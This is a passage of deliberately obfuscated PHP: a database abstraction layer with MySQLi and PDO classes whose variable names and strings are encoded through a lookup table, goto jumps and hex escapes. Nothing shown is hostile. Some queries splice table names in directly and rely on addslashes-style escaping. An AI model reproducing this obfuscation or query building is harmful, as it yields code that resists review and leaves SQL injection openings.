$Œî˜¥ê¡ = $ÎµÇ”âÃ->query($…•ÑØ†˜); if (empty($Œî˜¥ê¡)) { $˘Ú™Äêá = array($òª√á˛ì[784] => $òª√á˛ì[12], $òª√á˛ì[13] => $òª√á˛ì[12]); return $∞˘ÿù≥¶ ? $˘Ú™Äêá[$∞˘ÿù≥¶] : $˘Ú™Äêá; } $Ãõ°‡Õ– = $ÎµÇ”âÃ->query($Äï˝®§Ø); $Ωô“ÄÑ∞ = $Öøﬁπ‚£ = array(); foreach ($Ãõ°‡Õ– as $¬°Ú‰ŸÜ) { if ($¬°Ú‰ŸÜ[$òª√á˛ì[33]] == $òª√á˛ì[283]) { $Ωô“ÄÑ∞[] = $¬°Ú‰ŸÜ[$òª√á˛ì[1106]]; } else { $Öøﬁπ‚£[$¬°Ú‰ŸÜ[$òª√á˛ì[32]]] = $¬°Ú‰ŸÜ[$òª√á˛ì[1106]]; } } $áº∂†âÕ = array_merge(array($òª√á˛ì[1102] . $™í‘ﬂ√ç . $òª√á˛ì[127]), $Ωô“ÄÑ∞, array_values($Öøﬁπ‚£)); $áº∂†âÕ = implode($òª√á˛ì[81] . PHP_EOL, $áº∂†âÕ) . $òª√á˛ì[81]; if ($∞˘ÿù≥¶ && $∞˘ÿù≥¶ == $òª√á˛ì[13]) { return $áº∂†âÕ; } $˛ë¡ÍªÊ = array(); $¿ñÒë—Ò = array($òª√á˛ì[1094] => $òª√á˛ì[1107], $òª√á˛ì[319] => $òª√á˛ì[1108]); $¡ˆ€Ä˛≈ = $òª√á˛ì[12]; foreach ($Œî˜¥ê¡ as $¬°Ú‰ŸÜ) { if ($¬°Ú‰ŸÜ[$òª√á˛ì[57]] == $òª√á˛ì[99]) { $¡ˆ€Ä˛≈ = $¬°Ú‰ŸÜ[$òª√á˛ì[32]]; } $∞îÏ¢‚õ = array($òª√á˛ì[389] . $¬°Ú‰ŸÜ[$òª√á˛ì[32]] . $òª√á˛ì[389], isset($¿ñÒë—Ò[$¬°Ú‰ŸÜ[$òª√á˛ì[33]]]) ? $¿ñÒë—Ò[$¬°Ú‰ŸÜ[$òª√á˛ì[33]]] : $¬°Ú‰ŸÜ[$òª√á˛ì[33]], $¬°Ú‰ŸÜ[$òª√á˛ì[35]] == $òª√á˛ì[99] ? $òª√á˛ì[1099] : $òª√á˛ì[1109] . $¬°Ú‰ŸÜ[$òª√á˛ì[56]], $¬°Ú‰ŸÜ[$òª√á˛ì[57]] == $òª√á˛ì[99] ? $òª√á˛ì[1110] : $òª√á˛ì[12]); $˛ë¡ÍªÊ[] = trim(implode($òª√á˛ì[53], $∞îÏ¢‚õ)); } foreach ($Öøﬁπ‚£ as $∏ßÅ§Ó¡ => $ãŒ¢êÓ ) { $Ûûá∏… = str_replace($òª√á˛ì[1111] . $™í‘ﬂ√ç . $òª√á˛ì[11], $òª√á˛ì[12], $∏ßÅ§Ó¡); $¯√ÏÁê‰ = str_replace(array($òª√á˛ì[127], $òª√á˛ì[933]), $òª√á˛ì[389], substr($ãŒ¢êÓ , stripos($ãŒ¢êÓ , $òª√á˛ì[264]))); if ($Ûûá∏… == $òª√á˛ì[1088]) { $ì‹öË≈ƒ = $òª√á˛ì[1112] . $¡ˆ€Ä˛≈ . $òª√á˛ì[1113]; } else { $ì‹öË≈ƒ = (stripos($Ûûá∏…, $òª√á˛ì[11]) ? $òª√á˛ì[1114] : $òª√á˛ì[12]) . ($òª√á˛ì[1115] . $Ûûá∏… . $òª√á˛ì[1116] . $¯√ÏÁê‰); } $˛ë¡ÍªÊ[] = $ì‹öË≈ƒ; } $—œ©çòµ = array($òª√á˛ì[1117] . $™í‘ﬂ√ç . $òª√á˛ì[1118], $òª√á˛ì[1119] . $™í‘ﬂ√ç . $òª√á˛ì[1120], implode($òª√á˛ì[50] . PHP_EOL, $˛ë¡ÍªÊ), $òª√á˛ì[1121]); $®§ßùá¡ = implode(PHP_EOL, $—œ©çòµ); if ($∞˘ÿù≥¶ && $∞˘ÿù≥¶ == $òª√á˛ì[784]) { return $®§ßùá¡; } $˘Ú™Äêá = array($òª√á˛ì[784] => $®§ßùá¡, $òª√á˛ì[13] => $áº∂†âÕ); return $∞˘ÿù≥¶ ? $˘Ú™Äêá[$∞˘ÿù≥¶] : $˘Ú™Äêá; } } goto bπ¯πú¬è‰; c˘ëÁ≈éá: class DbMysqli extends Db { public function __construct($Öàœ¶¿» = '') { $Ê‚≠∫ºÕ =& $_SERVER[ëæªã÷]; if (!extension_loaded($Ê‚≠∫ºÕ[888])) { think_exception(think_lang($Ê‚≠∫ºÕ[14]) . $Ê‚≠∫ºÕ[889]); } if (!empty($Öàœ¶¿»)) { $this->config = $Öàœ¶¿»; if (empty($this->config[$Ê‚≠∫ºÕ[17]])) { $this->config[$Ê‚≠∫ºÕ[17]] = $Ê‚≠∫ºÕ[12]; } } } public function connect($«¯›Œ‡î = '', $åñ⁄Õ√¬ = 0) { $Ú¡ù®Ã⁄ =& $_SERVER[ëæªã÷]; if (!isset($this->linkID[$åñ⁄Õ√¬])) { if (empty($«¯›Œ‡î)) { $«¯›Œ‡î = $this->config; } $this->linkID[$åñ⁄Õ√¬] = new mysqli($«¯›Œ‡î[$Ú¡ù®Ã⁄[862]], $«¯›Œ‡î[$Ú¡ù®Ã⁄[864]], $«¯›Œ‡î[$Ú¡ù®Ã⁄[865]], $«¯›Œ‡î[$Ú¡ù®Ã⁄[21]], $«¯›Œ‡î[$Ú¡ù®Ã⁄[863]] ? intval($«¯›Œ‡î[$Ú¡ù®Ã⁄[863]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $®œΩºÛï = $this->linkID[$åñ⁄Õ√¬]->server_version; $this->linkID[$åñ⁄Õ√¬]->query($Ú¡ù®Ã⁄[866] . think_config($Ú¡ù®Ã⁄[867]) . $Ú¡ù®Ã⁄[58]); if ($®œΩºÛï > $Ú¡ù®Ã⁄[868]) { $this->linkID[$åñ⁄Õ√¬]->query($Ú¡ù®Ã⁄[869]); } $this->connected = !0; if (1 != think_config($Ú¡ù®Ã⁄[22])) { unset($this->config); } } return $this->linkID[$åñ⁄Õ√¬]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($õ≤‰¨∑ì) { $¥ó§À˝´ =& $_SERVER[ëæªã÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $õ≤‰¨∑ì; if ($this->queryID) { $this->free(); } think_action_status($¥ó§À˝´[23], 1); think_status($¥ó§À˝´[24]); $this->queryID = $this->_linkID->query($õ≤‰¨∑ì); if ($this->_linkID->more_results()) { while (($Ô⁄Î±Ü≈ = $this->_linkID->next_result()) != NULL) { $Ô⁄Î±Ü≈->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Èï¨ú¶˜) { $ÚÔÕô¨ì =& $_SERVER[ëæªã÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Èï¨ú¶˜; if ($this->queryID) { $this->free(); } think_action_status($ÚÔÕô¨ì[25], 1); think_status($ÚÔÕô¨ì[24]); $§˜¶√«ı = $this->_linkID->query($Èï¨ú¶˜); $this->debug(); if (!1 === $§˜¶√«ı) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $≠¿“Áª≤ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$≠¿“Áª≤) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $°◊À∂’µ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$°◊À∂’µ) { $this->error(); return !1; } } return !0; } private function getAll() { $Ìª“•ø¶ = array(); if ($this->numRows > 0) { for ($îõÍ¯∞ã = 0; $îõÍ¯∞ã < $this->numRows; $îõÍ¯∞ã++) { $Ìª“•ø¶[$îõÍ¯∞ã] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Ìª“•ø¶; } public function getFields($çà√· ˛) { $ÛÖñ≈˘ﬁ =& $_SERVER[ëæªã÷]; $ç√ÛÓ¸ã = $this->query($ÛÖñ≈˘ﬁ[873] . $this->parseKey($çà√· ˛)); $ØíØà¨Ü = array(); if ($ç√ÛÓ¸ã) { foreach ($ç√ÛÓ¸ã as $µçî¿’ê => $ΩÒ·âµö) { $ØíØà¨Ü[$ΩÒ·âµö[$ÛÖñ≈˘ﬁ[31]]] = array($ÛÖñ≈˘ﬁ[32] => $ΩÒ·âµö[$ÛÖñ≈˘ﬁ[31]], $ÛÖñ≈˘ﬁ[33] => $ΩÒ·âµö[$ÛÖñ≈˘ﬁ[34]], $ÛÖñ≈˘ﬁ[35] => (bool) ($ΩÒ·âµö[$ÛÖñ≈˘ﬁ[36]] === $ÛÖñ≈˘ﬁ[12]), $ÛÖñ≈˘ﬁ[37] => $ΩÒ·âµö[$ÛÖñ≈˘ﬁ[38]], $ÛÖñ≈˘ﬁ[39] => strtolower($ΩÒ·âµö[$ÛÖñ≈˘ﬁ[40]]) == $ÛÖñ≈˘ﬁ[41], $ÛÖñ≈˘ﬁ[42] => strtolower($ΩÒ·âµö[$ÛÖñ≈˘ﬁ[43]]) == $ÛÖñ≈˘ﬁ[44]); } } return $ØíØà¨Ü; } public function getTables($ÉÉﬁ Èü = '') { $Íë§¡”Õ =& $_SERVER[ëæªã÷]; $•ëóÈûÌ = !empty($ÉÉﬁ Èü) ? $Íë§¡”Õ[875] . $ÉÉﬁ Èü . $Íë§¡”Õ[876] : $Íë§¡”Õ[877]; $¶øêÊä» = $this->query($•ëóÈûÌ); $–¨·ÛèÁ = array(); if ($¶øêÊä») { foreach ($¶øêÊä» as $ÖªÃ¶ó‚ => $‹úôƒìØ) { $–¨·ÛèÁ[$ÖªÃ¶ó‚] = current($‹úôƒìØ); } } return $–¨·ÛèÁ; } public function replace($ƒ≥ÁúÅ†, $öæä€‡‡ = array()) { $æûˆù®∆ =& $_SERVER[ëæªã÷]; foreach ($ƒ≥ÁúÅ† as $Ôå∞Äø‡ => $·ª◊ıÙ) { $˛·„éÑ∫ = $this->parseValue($·ª◊ıÙ); if (is_scalar($˛·„éÑ∫)) { $Ω˚‡‡Õ÷[] = $˛·„éÑ∫; $¿î¨‰Èõ[] = $this->parseKey($Ôå∞Äø‡); } } $ºØÆ¢Ê¨ = $æûˆù®∆[878] . $this->parseTable($öæä€‡‡[$æûˆù®∆[283]]) . $æûˆù®∆[879] . implode($æûˆù®∆[50], $¿î¨‰Èõ) . $æûˆù®∆[880] . implode($æûˆù®∆[50], $Ω˚‡‡Õ÷) . $æûˆù®∆[881]; return $this->execute($ºØÆ¢Ê¨); } public function insertAll($∏ —Ω©∑, $∏ßòÍÖÂ = array(), $¡±§¿◊å = false) { $¶Ó ÀËÿ =& $_SERVER[ëæªã÷]; if (!is_array($∏ —Ω©∑[0])) { return !1; } $π›∂Ω˚î = array_keys($∏ —Ω©∑[0]); $Öﬁ÷¡ôë = array(); foreach ($∏ —Ω©∑ as $Ô∞úï˘á) { $îøé◊»≥ = array(); foreach ($Ô∞úï˘á as $ÿŒá°À¸ => $à◊ìÂ»¶) { $à◊ìÂ»¶ = $this->parseValue($à◊ìÂ»¶); if (is_scalar($à◊ìÂ»¶)) { $îøé◊»≥[] = $à◊ìÂ»¶; } } $Öﬁ÷¡ôë[] = $¶Ó ÀËÿ[264] . implode($¶Ó ÀËÿ[50], $îøé◊»≥) . $¶Ó ÀËÿ[881]; } array_walk($π›∂Ω˚î, array($this, $¶Ó ÀËÿ[882])); $ÚòÜ»Ûë = $¡±§¿◊å ? $¶Ó ÀËÿ[883] : $¶Ó ÀËÿ[884]; $¿…≈Üà˚ = $ÚòÜ»Ûë . $¶Ó ÀËÿ[885] . $this->parseTable($∏ßòÍÖÂ[$¶Ó ÀËÿ[283]]) . $¶Ó ÀËÿ[879] . implode($¶Ó ÀËÿ[50], $π›∂Ω˚î) . $¶Ó ÀËÿ[886] . implode($¶Ó ÀËÿ[50], $Öﬁ÷¡ôë); return $this->execute($¿…≈Üà˚); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $≤ﬂÛ¨˜Ÿ =& $_SERVER[ëæªã÷]; $this->error = $this->_linkID->errno . $≤ﬂÛ¨˜Ÿ[4] . $this->_linkID->error; if ($≤ﬂÛ¨˜Ÿ[12] != $this->queryStr) { $this->error .= LNG($≤ﬂÛ¨˜Ÿ[48]) . $this->queryStr; } think_trace($this->error, $≤ﬂÛ¨˜Ÿ[12], $≤ﬂÛ¨˜Ÿ[49]); return $this->error; } public function escapeString($ÿ›˙´Ä©) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÿ›˙´Ä©); } else { return addslashes($ÿ›˙´Ä©); } } public function parseKey(&$¡µÇÏ¶∑, $”∑ŸÌ”Í = true) { $äŸù˝ìÅ =& $_SERVER[ëæªã÷]; if ($”∑ŸÌ”Í) { $¡µÇÏ¶∑ = $this->parseKeyCheck($¡µÇÏ¶∑); } if ($¡µÇÏ¶∑ != $äŸù˝ìÅ[191] && !preg_match($äŸù˝ìÅ[887], $¡µÇÏ¶∑)) { $¡µÇÏ¶∑ = $äŸù˝ìÅ[389] . trim($¡µÇÏ¶∑, $äŸù˝ìÅ[389]) . $äŸù˝ìÅ[389]; } return $¡µÇÏ¶∑; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($˙ÂõÈ⁄ = '') { $¿äÓ¢°Å =& $_SERVER[ëæªã÷]; if (!class_exists($¿äÓ¢°Å[890])) { think_exception(think_lang($¿äÓ¢°Å[14]) . $¿äÓ¢°Å[891]); } if (!empty($˙ÂõÈ⁄)) { $this->config = $˙ÂõÈ⁄; if (empty($this->config[$¿äÓ¢°Å[17]])) { $this->config[$¿äÓ¢°Å[17]] = array(); } } } public function connect($òÆà÷¬≤ = '', $◊⁄óÛ†û = 0) { $§∑¬ìÿ» =& $_SERVER[ëæªã÷]; if (!isset($this->linkID[$◊⁄óÛ†û])) { if (empty($òÆà÷¬≤)) { $òÆà÷¬≤ = $this->config; } $‚Úªƒ◊· = !empty($òÆà÷¬≤[$§∑¬ìÿ»[17]][$§∑¬ìÿ»[18]]) ? $òÆà÷¬≤[$§∑¬ìÿ»[17]][$§∑¬ìÿ»[18]] : $this->pconnect; if ($‚Úªƒ◊·) { $òÆà÷¬≤[$§∑¬ìÿ»[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$◊⁄óÛ†û] = new PDO($òÆà÷¬≤[$§∑¬ìÿ»[892]], $òÆà÷¬≤[$§∑¬ìÿ»[864]], $òÆà÷¬≤[$§∑¬ìÿ»[865]], $òÆà÷¬≤[$§∑¬ìÿ»[17]]); } catch (PDOException $—àƒë‰ç) { think_exception($—àƒë‰ç->getMessage()); } $this->dbType = $this->_getDsnType($òÆà÷¬≤[$§∑¬ìÿ»[892]]); if (in_array($this->dbType, array($§∑¬ìÿ»[893], $§∑¬ìÿ»[894], $§∑¬ìÿ»[895], $§∑¬ìÿ»[896]))) { think_exception($§∑¬ìÿ»[897] . $this->dbType . $§∑¬ìÿ»[898] . $this->dbType . $§∑¬ìÿ»[899]); } if (!$this->linkID[$◊⁄óÛ†û]) { think_exception($§∑¬ìÿ»[900]); } try { $this->linkID[$◊⁄óÛ†û]->exec($§∑¬ìÿ»[901] . think_config($§∑¬ìÿ»[867])); } catch (Exception $—àƒë‰ç) { } $this->connected = !0; if (1 != think_config($§∑¬ìÿ»[22])) { unset($this->config); } } return $this->linkID[$◊⁄óÛ†û]; } public function free() { $this->PDOStatement = null; } public function query($ﬂ¶˛¶Ô”, $ÏÓ∑£“√ = array()) { $Ù¯¥≈†≠ =& $_SERVER[ëæªã÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ﬂ¶˛¶Ô”; if (!empty($ÏÓ∑£“√)) { $this->queryStr .= $Ù¯¥≈†≠[902] . print_r($ÏÓ∑£“√, !0) . $Ù¯¥≈†≠[903]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ù¯¥≈†≠[23], 1); think_status($Ù¯¥≈†≠[24]); $this->PDOStatement = $this->_linkID->prepare($ﬂ¶˛¶Ô”); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÆÏˆÿÙµ = $this->PDOStatement->execute($ÏÓ∑£“√); $this->debug(); if (!1 === $ÆÏˆÿÙµ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($éŸù—ıƒ, $æÇÙéà„ = array()) { $»¨Ω ûó =& $_SERVER[ëæªã÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $éŸù—ıƒ; if (!empty($æÇÙéà„)) { $this->queryStr .= $»¨Ω ûó[902] . print_r($æÇÙéà„, !0) . $»¨Ω ûó[903]; } $“ œ•àí = !1; if ($this->dbType == $»¨Ω ûó[896]) { if (preg_match($»¨Ω ûó[904], $this->queryStr, $’¢ÚÎéâ)) { $this->table = think_config($»¨Ω ûó[905]) . str_ireplace(think_config($»¨Ω ûó[906]), $»¨Ω ûó[382], $’¢ÚÎéâ[2]); $“ œ•àí = (bool) $this->query($»¨Ω ûó[907] . strtoupper($this->table) . $»¨Ω ûó[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($»¨Ω ûó[25], 1); think_status($»¨Ω ûó[24]); $this->PDOStatement = $this->_linkID->prepare($éŸù—ıƒ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Û‘Å¿€È = $this->PDOStatement->execute($æÇÙéà„); $this->debug(); if (!1 === $Û‘Å¿€È) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($“ œ•àí || preg_match($»¨Ω ûó[908], $éŸù—ıƒ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ë´ø˝Ÿ§ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Ë´ø˝Ÿ§) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¯√ﬂüÇ¥ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¯√ﬂüÇ¥) { $this->error(); return !1; } } return !0; } private function getAll() { $µÙ∫¥Ü€ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($µÙ∫¥Ü€); return $µÙ∫¥Ü€; } public function getFields($≠‘≠ï∆œ) { $√˝⁄Æùë =& $_SERVER[ëæªã÷]; $this->initConnect(!0); if (think_config($√˝⁄Æùë[909])) { $æƒ˛ü‹∑ = str_replace($√˝⁄Æùë[910], $≠‘≠ï∆œ, think_config($√˝⁄Æùë[909])); } else { switch ($this->dbType) { case $√˝⁄Æùë[893]: case $√˝⁄Æùë[911]: $æƒ˛ü‹∑ = "\x53\105\114\105\x43\124\x20\40\x20\143\x6f\x6c\165\155\156\137\x6e\x61\155\x65\x20\x61\x73\x20\47\x4e\x61\155\x65\x27\x2c\x20\40\40\144\141\x74\141\x5f\x74\x79\x70\x65\x20\141\x73\40\47\x54\171\x70\145\47\x2c\x20\40\x20\x63\x6f\x6c\x75\x6d\x6e\137\144\145\146\141\x75\154\164\40\141\163\x20\47\104\145\146\x61\x75\x6c\x74\47\x2c\40\x20\40\x69\x73\x5f\156\165\154\154\x61\x62\x6c\x65\x20\x61\163\40\x27\x4e\x75\x6c\x6c\x27\xa\11\x9\106\122\117\x4d\x9\x69\x6e\146\157\162\x6d\141\164\151\157\156\137\163\143\x68\145\155\x61\56\x74\x61\142\154\145\x73\40\x41\123\x20\164\12\11\11\112\117\111\116\11\151\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\156\137\x73\143\150\145\x6d\141\x2e\143\x6f\154\165\x6d\x6e\163\x20\101\123\x20\143\12\11\x9\117\116\40\x20\x74\x2e\164\141\142\x6c\x65\x5f\143\141\164\x61\x6c\157\x67\40\75\40\x63\x2e\164\x61\x62\154\145\x5f\143\x61\x74\x61\154\x6f\147\xa\11\11\x41\116\104\40\164\56\164\x61\x62\x6c\x65\137\163\x63\150\145\155\141\40\x3d\x20\x63\x2e\164\x61\142\x6c\145\x5f\x73\x63\150\145\x6d\x61\xa\11\11\x41\x4e\104\40\x74\56\x74\141\x62\x6c\x65\137\x6e\x61\x6d\145\x20\x3d\40\x63\56\164\141\x62\x6c\145\137\x6e\x61\155\x65\xa\x9\11\127\110\x45\x52\x45\40\x20\x20\164\x2e\164\141\142\154\145\x5f\156\141\155\145\x20\75\x20\47{$≠‘≠ï∆œ}\x27"; break; case $√˝⁄Æùë[912]: $æƒ˛ü‹∑ = $√˝⁄Æùë[913] . $≠‘≠ï∆œ . $√˝⁄Æùë[914]; break; case $√˝⁄Æùë[894]: case $√˝⁄Æùë[896]: $æƒ˛ü‹∑ = $√˝⁄Æùë[915] . $√˝⁄Æùë[916] . $√˝⁄Æùë[917] . strtoupper($≠‘≠ï∆œ) . $√˝⁄Æùë[918] . strtoupper($≠‘≠ï∆œ) . $√˝⁄Æùë[919]; break; case $√˝⁄Æùë[920]: $æƒ˛ü‹∑ = $√˝⁄Æùë[921] . $≠‘≠ï∆œ . $√˝⁄Æùë[922]; break; case $√˝⁄Æùë[895]: break; case $√˝⁄Æùë[923]: default: $æƒ˛ü‹∑ = $√˝⁄Æùë[924] . ($this->dbType == $√˝⁄Æùë[923] ? "\140{$≠‘≠ï∆œ}\140" : $≠‘≠ï∆œ); } } $Á›ü ü˘ = $this->query($æƒ˛ü‹∑); $»£Ëö‹˚ = array(); if ($Á›ü ü˘) { foreach ($Á›ü ü˘ as $≈À—˚î => $∆ÜÃá™Ÿ) { $∆ÜÃá™Ÿ = array_change_key_case($∆ÜÃá™Ÿ); $∆ÜÃá™Ÿ[$√˝⁄Æùë[32]] = isset($∆ÜÃá™Ÿ[$√˝⁄Æùë[32]]) ? $∆ÜÃá™Ÿ[$√˝⁄Æùë[32]] : $√˝⁄Æùë[382]; $∆ÜÃá™Ÿ[$√˝⁄Æùë[33]] = isset($∆ÜÃá™Ÿ[$√˝⁄Æùë[33]]) ? $∆ÜÃá™Ÿ[$√˝⁄Æùë[33]] : $√˝⁄Æùë[382]; $›–⁄˜¶ô = isset($∆ÜÃá™Ÿ[$√˝⁄Æùë[277]]) ? $∆ÜÃá™Ÿ[$√˝⁄Æùë[277]] : $∆ÜÃá™Ÿ[$√˝⁄Æùë[32]]; $»£Ëö‹˚[$›–⁄˜¶ô] = array($√˝⁄Æùë[32] => $›–⁄˜¶ô, $√˝⁄Æùë[33] => $∆ÜÃá™Ÿ[$√˝⁄Æùë[33]], $√˝⁄Æùë[35] => (bool) (isset($∆ÜÃá™Ÿ[$√˝⁄Æùë[114]]) && $∆ÜÃá™Ÿ[$√˝⁄Æùë[114]] === $√˝⁄Æùë[12] || isset($∆ÜÃá™Ÿ[$√˝⁄Æùë[35]]) && $∆ÜÃá™Ÿ[$√˝⁄Æùë[35]] === $√˝⁄Æùë[12]), $√˝⁄Æùë[37] => isset($∆ÜÃá™Ÿ[$√˝⁄Æùë[37]]) ? $∆ÜÃá™Ÿ[$√˝⁄Æùë[37]] : (isset($∆ÜÃá™Ÿ[$√˝⁄Æùë[56]]) ? $∆ÜÃá™Ÿ[$√˝⁄Æùë[56]] : $√˝⁄Æùë[382]), $√˝⁄Æùë[39] => isset($∆ÜÃá™Ÿ[$√˝⁄Æùë[105]]) ? strtolower($∆ÜÃá™Ÿ[$√˝⁄Æùë[105]]) == $√˝⁄Æùë[41] : (isset($∆ÜÃá™Ÿ[$√˝⁄Æùë[57]]) ? $∆ÜÃá™Ÿ[$√˝⁄Æùë[57]] : !1), $√˝⁄Æùë[42] => isset($∆ÜÃá™Ÿ[$√˝⁄Æùë[925]]) ? strtolower($∆ÜÃá™Ÿ[$√˝⁄Æùë[925]]) == $√˝⁄Æùë[44] : (isset($∆ÜÃá™Ÿ[$√˝⁄Æùë[105]]) ? $∆ÜÃá™Ÿ[$√˝⁄Æùë[105]] : !1)); } } return $»£Ëö‹˚; } public function getTables($‡€ï˘óá = '') { $≠Ç’µ¯∫ =& $_SERVER[ëæªã÷]; if (think_config($≠Ç’µ¯∫[926])) { $Ã»«à∫π = str_replace($≠Ç’µ¯∫[927], $‡€ï˘óá, think_config($≠Ç’µ¯∫[926])); } else { switch ($this->dbType) { case $≠Ç’µ¯∫[894]: case $≠Ç’µ¯∫[896]: $Ã»«à∫π = $≠Ç’µ¯∫[928]; break; case $≠Ç’µ¯∫[893]: case $≠Ç’µ¯∫[911]: $Ã»«à∫π = $≠Ç’µ¯∫[929]; break; case $≠Ç’µ¯∫[920]: $Ã»«à∫π = $≠Ç’µ¯∫[930]; break; case $≠Ç’µ¯∫[895]: think_exception(think_lang($≠Ç’µ¯∫[931]) . $≠Ç’µ¯∫[932]); break; case $≠Ç’µ¯∫[912]: $Ã»«à∫π = $≠Ç’µ¯∫[45] . $≠Ç’µ¯∫[46] . $≠Ç’µ¯∫[47]; break; case $≠Ç’µ¯∫[923]: default: if (!empty($‡€ï˘óá)) { $Ã»«à∫π = $≠Ç’µ¯∫[875] . $‡€ï˘óá . $≠Ç’µ¯∫[876]; } else { $Ã»«à∫π = $≠Ç’µ¯∫[877]; } } } $©√òñì¥ = $this->query($Ã»«à∫π); $´’∏—ıÿ = array(); foreach ($©√òñì¥ as $¥“Öﬂ‹ => $ ÖÌΩ–˘) { $´’∏—ıÿ[$¥“Öﬂ‹] = current($ ÖÌΩ–˘); } return $´’∏—ıÿ; } protected function parseLimit($áŸÏã€Õ) { $‚À‰›Àƒ =& $_SERVER[ëæªã÷]; $á„ÔÖèÓ = $‚À‰›Àƒ[12]; if (!empty($áŸÏã€Õ)) { switch ($this->dbType) { case $‚À‰›Àƒ[920]: case $‚À‰›Àƒ[912]: $áŸÏã€Õ = explode($‚À‰›Àƒ[50], $áŸÏã€Õ); if (count($áŸÏã€Õ) > 1) { $á„ÔÖèÓ .= $‚À‰›Àƒ[51] . $áŸÏã€Õ[1] . $‚À‰›Àƒ[52] . $áŸÏã€Õ[0] . $‚À‰›Àƒ[53]; } else { $á„ÔÖèÓ .= $‚À‰›Àƒ[51] . $áŸÏã€Õ[0] . $‚À‰›Àƒ[53]; } break; case $‚À‰›Àƒ[893]: case $‚À‰›Àƒ[911]: break; case $‚À‰›Àƒ[895]: break; case $‚À‰›Àƒ[894]: case $‚À‰›Àƒ[896]: break; case $‚À‰›Àƒ[923]: default: $á„ÔÖèÓ .= $‚À‰›Àƒ[51] . $áŸÏã€Õ . $‚À‰›Àƒ[53]; } } return $á„ÔÖèÓ; } public function parseKey(&$∂π†—âù, $Í¢Çµ¢˜ = true) { $÷ó¨ßîô =& $_SERVER[ëæªã÷]; if ($Í¢Çµ¢˜) { $∂π†—âù = $this->parseKeyCheck($∂π†—âù); } if ($this->dbType == $÷ó¨ßîô[923]) { if ($∂π†—âù != $÷ó¨ßîô[191] && !preg_match($÷ó¨ßîô[887], $∂π†—âù)) { $∂π†—âù = $÷ó¨ßîô[389] . trim($∂π†—âù, $÷ó¨ßîô[389]) . $÷ó¨ßîô[389]; } return $∂π†—âù; } else { return parent::parseKey($∂π†—âù, $Í¢Çµ¢˜); } } public function close() { $this->_linkID = null; } public function error() { $ñ¥ùµ◊˝ =& $_SERVER[ëæªã÷]; if ($this->PDOStatement) { $ó‰›Ã∑∫ = $this->PDOStatement->errorInfo(); $this->error = $ó‰›Ã∑∫[1] . $ñ¥ùµ◊˝[4] . $ó‰›Ã∑∫[2]; } else { $this->error = $ñ¥ùµ◊˝[12]; } if ($ñ¥ùµ◊˝[12] != $this->queryStr) { $this->error .= LNG($ñ¥ùµ◊˝[48]) . $this->queryStr; } think_trace($this->error, $ñ¥ùµ◊˝[12], $ñ¥ùµ◊˝[49]); return $this->error; } public function escapeString($ˆ®‘◊»“) { $‚˚¸É”æ =& $_SERVER[ëæªã÷]; switch ($this->dbType) { case $‚˚¸É”æ[920]: case $‚˚¸É”æ[893]: case $‚˚¸É”æ[911]: case $‚˚¸É”æ[923]: return addslashes($ˆ®‘◊»“); case $‚˚¸É”æ[895]: case $‚˚¸É”æ[912]: case $‚˚¸É”æ[894]: case $‚˚¸É”æ[896]: return str_ireplace($‚˚¸É”æ[58], $‚˚¸É”æ[59], $ˆ®‘◊»“); } } protected function parseValue($»·πì˝ö) { $ø«≤ÄÙô =& $_SERVER[ëæªã÷]; if (is_string($»·πì˝ö)) { $Éò¸Ò√Æ = strpos($»·πì˝ö, $ø«≤ÄÙô[4]) === 0 && in_array($»·πì˝ö, array_keys($this->bind)); $»·πì˝ö = $Éò¸Ò√Æ ? $this->escapeString($»·πì˝ö) : $ø«≤ÄÙô[933] . $this->escapeString($»·πì˝ö) . $ø«≤ÄÙô[933]; } elseif (isset($»·πì˝ö[0]) && is_string($»·πì˝ö[0]) && strtolower($»·πì˝ö[0]) == $ø«≤ÄÙô[301]) { $»·πì˝ö = $this->escapeString($»·πì˝ö[1]); } elseif (is_array($»·πì˝ö)) { $»·πì˝ö = array_map(array($this, $ø«≤ÄÙô[934]), $»·πì˝ö); } elseif (is_bool($»·πì˝ö)) { $»·πì˝ö = $»·πì˝ö ? $ø«≤ÄÙô[99] : $ø«≤ÄÙô[200]; } elseif (is_null($»·πì˝ö)) { $»·πì˝ö = 